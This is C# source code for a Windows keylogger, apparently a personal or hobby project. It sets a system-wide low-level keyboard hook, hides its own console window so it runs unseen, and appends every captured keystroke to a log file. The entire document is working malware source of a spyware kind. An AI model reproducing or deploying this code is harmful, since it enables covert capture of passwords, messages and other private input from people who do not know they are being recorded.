using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices; 
using System.Diagnostics;
using System.Windows.Forms; 
using System.IO; 

namespace CvetkovskiIvorKeyLogger
{
    class Program
    {
        private static int WH_KEYBOARD_LL = 13;
        private static int WM_KEYDOWN = 0x0100;
        private static IntPtr hook = IntPtr.Zero; 
        private static LowLevelKeyboardProc llkProcedure = HookCallback;

        static int SW_SHOW = 5;
        static int SW_HIDE = 0;

        static void Main(string[] args)
        {
            IntPtr myWindow = GetConsoleWindow();
            ShowWindow(myWindow, SW_HIDE);

            hook = SetHook(llkProcedure);
            Application.Run();
            UnhookWindowsHookEx(hook);
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) 
        {
            if(nCode >=0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                if (((Keys)vkCode).ToString() == "OemPeriod")
                {
                    Console.Out.Write(".");
                    StreamWriter output = new StreamWriter(@"C:\Users\Ivor\Desktop\mylog.txt", true);
                    output.Write(".");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Oemcomma")
                {
                    Console.Out.Write(",");
                    StreamWriter output = new StreamWriter(@"C:\Users\Ivor\Desktop\mylog.txt", true);
                    output.Write(",");
                    output.Close();
                }
                else if (((Keys)vkCode).ToString() == "Space")
                {
                    Console.Out.Write(" ");
                    StreamWriter output = new StreamWriter(@"C:\Users\Ivor\Desktop\mylog.txt", true);
                    output.Write(" ");
                    output.Close();
                }
                else
                {
                    Console.Out.Write((Keys)vkCode);
                    StreamWriter output = new StreamWriter(@"C:\Users\Ivor\Desktop\mylog.txt", true);
                    output.Write((Keys)vkCode);
                    output.Close();
                }
            }
            
            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            Process currentProcess = Process.GetCurrentProcess();
            ProcessModule currentModule = currentProcess.MainModule;
            String moduleName = currentModule.ModuleName;
            IntPtr moduleHandle = GetModuleHandle(moduleName);
            return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, moduleHandle, 0);
        }

        #region DllImports
        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(String lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        #endregion

    }
}
